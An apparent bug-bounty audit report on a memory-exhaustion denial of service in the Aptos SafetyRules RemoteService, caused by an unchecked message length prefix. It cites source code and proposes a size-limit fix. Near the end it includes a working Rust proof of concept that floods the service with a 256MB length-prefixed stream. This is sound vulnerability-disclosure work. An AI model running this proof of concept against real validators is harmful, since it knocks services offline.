# Audit Report

## Title
Memory Exhaustion Denial of Service in SafetyRules RemoteService via Unbounded Message Size

## Summary
The SafetyRules RemoteService accepts untrusted network data and deserializes it without validating message size limits, allowing attackers to cause memory exhaustion and crash the SafetyRules service by sending messages with maliciously large length prefixes.

## Finding Description

The TSafetyRules trait implementations using the RemoteService configuration are vulnerable to memory exhaustion attacks through unbounded message size acceptance. The attack surface exists in the network communication layer used by SafetyRules when deployed in Process mode.

**Vulnerable Code Path:**

1. **NetworkStream accepts unbounded message sizes** [1](#0-0) 

The `read_buffer()` method reads a u32 length prefix and attempts to accumulate that many bytes without any maximum size validation. An attacker can send a length prefix of up to u32::MAX (~4GB).

2. **RemoteService passes untrusted network data directly to serializer** [2](#0-1) 

The `process_one_message` function reads raw bytes from the network and passes them directly to the serializer without size validation.

3. **SerializerService deserializes untrusted data without pre-validation** [3](#0-2) 

The `handle_message` method immediately deserializes incoming data using `serde_json::from_slice` without checking message size limits.

**Attack Scenario:**

An attacker connects to a validator's SafetyRules TCP service and sends:
- 4 bytes containing a large length prefix (e.g., 0x10000000 for 256MB)
- Streams data to fill the buffer

The NetworkStream accumulates data in memory until reaching the attacker-specified size [4](#0-3) , causing memory exhaustion before any validation occurs.

**Why Post-Deserialization Validation Doesn't Help:**

While SafetyRules does validate data after deserialization (epoch verification, QC validation, signature verification) [5](#0-4) , this validation happens AFTER memory has already been exhausted. The memory exhaustion occurs during message accumulation and deserialization, not during semantic validation.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program for the following reasons:

**Validator Node Slowdowns/Crashes:**
- Memory exhaustion causes the SafetyRules service to hang or crash
- Affected validators cannot vote on proposals or sign blocks
- Consensus liveness degrades if multiple validators are targeted simultaneously

**However, Impact is Significantly Limited:**

The configuration sanitizer explicitly prevents non-local SafetyRules services on mainnet [6](#0-5) . This means:
- **Mainnet validators are NOT vulnerable** (forced to use Local mode)
- Only testnet/devnet validators using RemoteService are affected
- Production systems are protected by configuration policy

## Likelihood Explanation

**Low Likelihood in Practice:**
- Mainnet validators must use Local mode (enforced by sanitizer)
- RemoteService is only used in test environments
- Requires network access to the SafetyRules TCP port
- Attack is easily detectable through memory monitoring

**Attack Complexity: Low**
- Simple TCP connection with crafted 4-byte length prefix
- No authentication required on the TCP socket [7](#0-6) 
- No special knowledge or resources needed

## Recommendation

Add maximum message size validation in NetworkStream before accumulating data:

```rust
// In secure/net/src/lib.rs, add constant:
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80; // 80MB, matching gRPC limit

// In read_buffer() method, after reading length prefix:
fn read_buffer(&mut self) -> Result<Vec<u8>, Error> {
    if self.buffer.len() < 4 {
        return Ok(Vec::new());
    }
    
    let mut u32_bytes = [0; 4];
    u32_bytes.copy_from_slice(&self.buffer[..4]);
    let data_size = u32::from_le_bytes(u32_bytes) as usize;
    
    // ADD THIS CHECK:
    if data_size > MAX_MESSAGE_SIZE {
        return Err(Error::DataTooLarge(data_size));
    }
    
    // ... rest of method
}
```

This matches the existing MAX_MESSAGE_SIZE limit used in the gRPC service [8](#0-7) .

## Proof of Concept

```rust
use std::net::TcpStream;
use std::io::Write;

fn exploit_safety_rules_dos(target_addr: &str) -> std::io::Result<()> {
    let mut stream = TcpStream::connect(target_addr)?;
    
    // Send malicious length prefix: 256MB
    let malicious_length: u32 = 256 * 1024 * 1024;
    stream.write_all(&malicious_length.to_le_bytes())?;
    
    // Stream data to fill the buffer
    let chunk = vec![0u8; 1024];
    for _ in 0..(malicious_length / 1024) {
        stream.write_all(&chunk)?;
    }
    
    // SafetyRules service will exhaust memory trying to accumulate 256MB
    Ok(())
}
```

**Notes:**

Despite being a valid vulnerability in the code, this finding has **critical limitations** that prevent it from meeting the highest standards for the bug bounty program:

1. **Mainnet Protection**: Configuration sanitizer prevents this vulnerability on mainnet
2. **DoS Scope Exclusion**: May fall under "Network-level DoS attacks are out of scope" exclusion
3. **Limited Production Impact**: Only affects non-production test environments
4. **No Consensus Violation**: Does not break consensus safety, only affects individual validator availability

This represents a defense-in-depth issue that should be fixed to harden testnet/devnet validators, but may not qualify for bug bounty rewards given the scope limitations and exclusions.

### Citations

**File:** secure/net/src/lib.rs (L365-404)
```rust
    fn client(&mut self) -> Result<&mut NetworkStream, Error> {
        if self.stream.is_none() {
            self.increment_counter(Method::Connect, MethodResult::Query);
            info!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::ConnectionAttempt,
            ));

            let listener = self.listener.as_mut().ok_or(Error::AlreadyShutdown)?;

            let (stream, stream_addr) = match listener.accept() {
                Ok(ok) => ok,
                Err(err) => {
                    self.increment_counter(Method::Connect, MethodResult::Failure);
                    let err = err.into();
                    warn!(SecureNetLogSchema::new(
                        &self.service,
                        NetworkMode::Server,
                        LogEvent::ConnectionSuccessful,
                    )
                    .error(&err));
                    return Err(err);
                },
            };

            self.increment_counter(Method::Connect, MethodResult::Success);
            info!(SecureNetLogSchema::new(
                &self.service,
                NetworkMode::Server,
                LogEvent::ConnectionSuccessful,
            )
            .remote_peer(&stream_addr));

            stream.set_nodelay(true)?;
            self.stream = Some(NetworkStream::new(stream, stream_addr, self.timeout_ms));
        }

        self.stream.as_mut().ok_or(Error::NoActiveStream)
    }
```

**File:** secure/net/src/lib.rs (L436-450)
```rust
        loop {
            trace!("Attempting to read from stream");
            let read = self.stream.read(&mut self.temp_buffer)?;
            trace!("Read {} bytes from stream", read);
            if read == 0 {
                return Err(Error::RemoteStreamClosed);
            }
            self.buffer.extend(self.temp_buffer[..read].to_vec());
            let result = self.read_buffer();
            if !result.is_empty() {
                trace!("Found a message in the stream");
                return Ok(result);
            }
            trace!("Did not find a message yet, reading again");
        }
```

**File:** secure/net/src/lib.rs (L479-496)
```rust
    fn read_buffer(&mut self) -> Vec<u8> {
        if self.buffer.len() < 4 {
            return Vec::new();
        }

        let mut u32_bytes = [0; 4];
        u32_bytes.copy_from_slice(&self.buffer[..4]);
        let data_size = u32::from_le_bytes(u32_bytes) as usize;

        let remaining_data = &self.buffer[4..];
        if remaining_data.len() < data_size {
            return Vec::new();
        }

        let returnable_data = remaining_data[..data_size].to_vec();
        self.buffer = remaining_data[data_size..].to_vec();
        returnable_data
    }
```

**File:** consensus/safety-rules/src/remote_service.rs (L47-55)
```rust
fn process_one_message(
    network_server: &mut NetworkServer,
    serializer_service: &mut SerializerService,
) -> Result<(), Error> {
    let request = network_server.read()?;
    let response = serializer_service.handle_message(request)?;
    network_server.write(&response)?;
    Ok(())
}
```

**File:** consensus/safety-rules/src/serializer.rs (L45-46)
```rust
    pub fn handle_message(&mut self, input_message: Vec<u8>) -> Result<Vec<u8>, Error> {
        let input = serde_json::from_slice(&input_message)?;
```

**File:** consensus/safety-rules/src/safety_rules.rs (L62-85)
```rust
    /// Validity checks
    pub(crate) fn verify_proposal(
        &mut self,
        vote_proposal: &VoteProposal,
    ) -> Result<VoteData, Error> {
        let proposed_block = vote_proposal.block();
        let safety_data = self.persistent_storage.safety_data()?;

        self.verify_epoch(proposed_block.epoch(), &safety_data)?;

        self.verify_qc(proposed_block.quorum_cert())?;
        if !self.skip_sig_verify {
            proposed_block
                .validate_signature(&self.epoch_state()?.verifier)
                .map_err(|error| Error::InvalidProposal(error.to_string()))?;
        }
        proposed_block
            .verify_well_formed()
            .map_err(|error| Error::InvalidProposal(error.to_string()))?;

        vote_proposal
            .gen_vote_data()
            .map_err(|error| Error::InvalidAccumulatorExtension(error.to_string()))
    }
```

**File:** config/src/config/safety_rules_config.rs (L99-104)
```rust
            if chain_id.is_mainnet() && !safety_rules_config.service.is_local() {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("The safety rules service should be set to local in mainnet for optimal performance! Given config: {:?}", &safety_rules_config.service)
                ));
            }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```
